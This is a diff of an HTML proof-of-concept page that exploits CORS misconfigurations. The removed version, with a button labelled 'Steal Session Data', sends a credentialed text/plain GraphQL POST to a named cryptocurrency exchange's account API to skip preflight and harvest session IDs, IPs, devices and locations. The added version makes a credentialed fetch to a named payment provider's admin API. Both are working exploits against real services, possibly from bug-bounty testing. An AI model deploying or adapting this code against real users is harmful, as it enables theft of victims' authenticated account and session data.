@@ -1,66 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>CORS GraphQL PoC</title>
-</head>
 <body>
-
-<h2>CORS Misconfiguration – GraphQL POST (No Preflight)</h2>
-<button id="run">Steal Session Data</button>
-<pre id="out">Click the button…</pre>
+<h2>CORS PoC</h2>
+<pre id="output">Loading...</pre>
 
 <script>
-document.getElementById("run").onclick = function () {
-
-  const target = "https://profile.cex.io/account-api/graphql";
-  const out = document.getElementById("out");
-
-  out.textContent = "Sending POST request WITHOUT preflight...\n";
-
-  const xhr = new XMLHttpRequest();
-  xhr.open("POST", target, true);
-
-  // 🔥 المهم
-  xhr.withCredentials = true;
-
-  // ✅ Simple Content-Type → no OPTIONS
-  xhr.setRequestHeader("Content-Type", "text/plain");
-
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4) {
-      out.textContent =
-        "STATUS: " + xhr.status + " " + xhr.statusText + "\n\n" +
-        "RESPONSE HEADERS:\n" +
-        xhr.getAllResponseHeaders() + "\n\n" +
-        "RESPONSE BODY:\n" +
-        xhr.responseText;
-
-      console.log("CORS PoC response:", xhr.responseText);
-    }
-  };
-
-  // GraphQL body عادي
-  const body = `
-{
-  "query": "{
-    sessionManager {
-      device
-      deviceType
-      ip
-      lastActiveTime
-      sessionId
-      isCurrent
-      location
-    }
-  }"
-}
-`;
-
-  xhr.send(body);
-};
+fetch("https://api-admin.paydo.com/v1/request/info", {
+    method: "GET",
+    credentials: "include" 
+})
+.then(r => r.text())
+.then(data => {
+    document.getElementById("output").textContent = data;
+})
+.catch(e => {
+    document.getElementById("output").textContent = "Error: " + e;
+});
 </script>
 
 </body>
 </html>
-
